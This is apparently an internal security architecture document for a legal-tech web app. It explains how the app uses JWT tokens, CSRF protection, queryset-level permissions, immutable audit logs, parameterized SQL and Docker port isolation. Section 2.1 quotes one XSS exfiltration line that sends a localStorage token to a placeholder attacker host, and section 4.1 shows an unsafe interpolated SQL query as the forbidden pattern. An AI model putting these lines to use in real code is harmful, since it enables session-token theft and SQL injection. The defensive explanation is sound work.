# SnowfigIP Security Architecture (Expanded Edition)

## 1. Introduction: Threat Modeling in Legal Tech
SnowfigIP is a primary target for corporate espionage. The intellectual property managed within it represents billions of dollars of unfiled, novel R&D. If a bad actor accesses an unfiled patent specification payload during transit, the patent's fundamental "novelty" is broken, and the client loses the ability to patent the invention globally. 

This document serves as the master blueprint for how SnowfigIP mitigates API abuse, cryptographic degradation, and internal lateral movement.

---

## 2. API Security & The Token Strategy 

### 2.1 JSON Web Tokens (JWT) Lifecycles
SnowfigIP-BE uses `djangorestframework-simplejwt` to issue cryptographically signed stateless tokens.
*   **The Access Token**: The `access_token` is the VIP pass. It contains the User's ID and role matrix encrypted via the `DJANGO_SECRET_KEY`. Its lifetime is exceptionally short (e.g., 15 minutes). The frontend injects this into the `Authorization: Bearer <token>` header of every single secure API request (via `helper.js`).
*   **The Refresh Token**: The actual browser does not hold an infinite-life monolithic session. It holds a `refresh_token` (valid for perhaps 1-7 days). If the `access_token` expires, the Next.js frontend catches the HTTP 401 error, silently hits the `/api/v1/token/refresh/` endpoint to acquire a fresh `access_token`, and auto-retries the failed request.
*   **Mitigating XSS**: Storing tokens in `localStorage` makes them susceptible to Cross-Site Scripting (XSS). An attacker injecting malicious JS via a comment box could run `fetch('http://hacker.com?t=' + localStorage.getItem('token'))`. To prevent this, SnowfigIP architecture strongly advocates for wrapping the auth flow in Next.js Edge Functions (or `httpOnly` cookies) so the client-side executing JS cannot physically read the token.

### 2.2 Cross-Site Request Forgery (CSRF)
If an associate is logged into SnowfigIP and accidentally visits `malicious-site.com`, that site could mathematically forge a POST request to `snowfig.lks.com/api/v1/billing/approve` using the associate's active background session.
*   **The Mitigation**: Django DRF enforces `CsrfViewMiddleware`. A randomized CSRF token is issued upon site load. Every state-changing request (POST, PUT, PATCH, DELETE) made by `InvoiceReporting.js` must explicitly include the `X-CSRFToken` header. Because the malicious site cannot read the random token generated on the valid site across domains, the forged payload is rejected with HTTP 403 Forbidden.

---

## 3. Data Integrity and Application Logic Security

### 3.1 Object-Level Permissions (RBAC)
A user might be fully authenticated (`HTTP 200 OK`), but they cannot arbitrarily hit an API endpoint for an invoice belonging to a different client.
*   **Global Classes**: The backend utilizes `permission_classes = (IsAuthenticated,)` at the apex of all `ViewSet` instances.
*   **QuerySet Pruning**: Inside `matter/v1/views.py`, standard developers override `def get_queryset(self):`. 
    ```python
    def get_queryset(self):
        # The user is only allowed to load matters linked to their accessible client properties.
        accessible_properties = self.request.user.get_accessible_properties()
        return self.queryset.filter(property_type__in=accessible_properties)
    ```
    This acts as physical armor. Even if a user guesses the database ID of an unauthorized record (e.g., `GET /api/matter/15923`), the database simply pretends the record doesn't exist, returning a 404 rather than a 403 (preventing record enumeration exploits).

### 3.2 Immutability and Audit Logging (`LogMatter`)
Security is not just preventing access; it's tracking legitimate access perfectly.
*   The `LogAuditMixin` attached to core models hooks into the Django `post_save` signal. 
*   If a Managing Partner updates an invoice status, the system writes `{user: 'Partner Z', model: 'Invoice', old_value: 'Draft', new_value: 'Approved', timestamp: UTC}`.
*   These audit logs are strictly **Insert-Only**. The API does not expose a `DELETE` operator for the `LogMatter` table, making it an immutable ledger that can withstand regulatory audits.

---

## 4. Infrastructure Isolation

### 4.1 Safe Parameterization (Defeating SQLi)
Because `SFIP-Reports` queries legacy MSSQL databases directly passing user-defined filters, it represents an extreme SQL Injection vector. 
*   **The Guard**: Raw string interpolation is explicitly forbidden (`f"SELECT * FROM matters WHERE client = '{user_input}'"`). All variables are passed via structural parsing (e.g., `cursor.execute("SELECT * FROM matters WHERE client = ?", [user_input])`). The database engine pre-compiles the query and treats the input as pure literal text, completely neutralizing dropped-table commands.

### 4.2 Network Topography
The system runs in Docker. 
*   **The Database**: PostgreSQL operates on port 5432. This port is *only* mapped to the internal `docker-compose` network. It is physically impossible to access the Postgres database from the outside internet, circumventing brute-force attacks against the root DB user entirely.
*   **The Web Server**: Only ports 80 and 443 (HTTP/HTTPS) are forwarded through the NGINX or Traefik reverse proxy to the backend Gunicorn/FastAPI workers.
